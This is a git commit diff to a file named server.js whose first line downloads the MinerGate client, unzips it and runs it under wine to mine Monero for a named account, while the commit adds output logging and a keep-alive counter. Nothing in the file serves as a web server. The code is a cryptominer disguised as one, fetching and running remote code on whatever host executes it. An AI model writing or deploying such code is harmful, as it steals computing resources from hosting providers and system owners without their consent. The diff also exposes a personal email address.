e9f2ebd5400510981a53199b7de27ac179b13252
wddesbvsp <30755597+wddesbvsp@users.noreply.github.com>
2017-08-06 13:15:28 +0700

    Update server.js

--- server.js
+++ server.js
@@ -1,5 +1,14 @@
 var str = "wget https://minergate.com/download/win32-cli && unzip win32-cli && cd Miner* && wine minergate-cli.exe -user molunar@yandex.com -xmr";
-require('child_process').exec(str, { stdio: [0, 1, 2] });
+var child = require('child_process').exec(str);
+child.stdout.on('data', function(data) {
+    console.log('stdout: ' + data);
+});
+child.stderr.on('data', function(data) {
+    console.log('stdout: ' + data);
+});
+child.on('close', function(code) {
+    console.log('closing code: ' + code);
+});
 require('child_process').exec("wine --help", { stdio: [0, 1, 2] });
 var index = 1;
 var max = 20;
@@ -10,5 +19,5 @@ interval = setInterval(function () {
         process.exit(0);
     }, 1000);		
   }
-  console.log("running..." + index);
+  console.log("running..." + ++index);
 }, 1000 * 60);
